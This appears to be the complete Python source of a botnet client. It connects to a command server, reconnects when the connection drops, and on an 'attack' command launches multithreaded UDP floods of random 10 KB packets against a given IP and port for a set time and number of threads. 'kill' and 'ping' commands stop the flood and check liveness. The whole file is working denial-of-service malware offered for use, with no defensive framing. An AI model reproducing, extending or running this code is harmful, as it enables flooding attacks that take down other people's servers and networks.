from threading import Thread
from time import time, sleep
import socket, signal
import sys, random
from typing import Tuple

class Client():
	run=False
	def __init__(self, connect:Tuple[str,int]=("127.0.0.1",9999)) -> None:
		signal.signal(signal.SIGINT, self.exit_gracefully)
		signal.signal(signal.SIGTERM, self.exit_gracefully)
		self.stop = False
		self.run = False
		while not self.stop:
			try:
				self._connect(connect)
			except KeyboardInterrupt:
				continue
			except Exception as e:
				print(f"Error connecting {connect}| Sleep 10 seconds")
				sleep(10)

	def exit_gracefully(self,signum, frame):
		print("\nExiting....")
		self.stop = True
		self.run = False
		self.sock.close()
		sleep(1)
		sys.exit(0)

	def _connect(self, connect:Tuple[str,int]) -> None:
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.connect(connect)
		self.start()

	def __ddos(self,*args):

		def dos(*args):
			t1=time()
			host,port=args[1],args[2]

			s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			bytes=random._urandom(10240)
			s.connect((host, int(port)))
			while self.run:
				if not self.run:break
				s.sendto(bytes, (host,int(port)))
				
			s.close()
			print("run time {}".format(time()-t1))
		for n in range(int(args[4])):
			Thread(target = dos,args=[*args]).start()
		sleep(int(args[3]))
		self.run=False

	def _recv(self):
		return self.sock.recv(1024).decode("ascii").lower()

	def start(self):
		while True:
			data = self._recv()
			if "attack" in data:

				data=data.replace("attack ","").split()
				try:
					proto, ip, port, sec, workers =  data
					data = proto, ip, int(port), int(sec), int(workers)
					self.sock.send("done".encode("ascii"))
				except Exception as e:
					print(e)
					self.sock.send("invalid command".encode("ascii"))
					continue

				self.run=True
				Thread(target = self.__ddos,args=data).start()
			elif "kill" in data:
				self.run=False
				self.sock.send(str.encode("Server Stopped"))
			elif "ping" in data:
				self.sock.send(str.encode("Pong"))
			else:
				self.sock.send(str.encode("ERROR"))


if __name__ == '__main__':
	Client()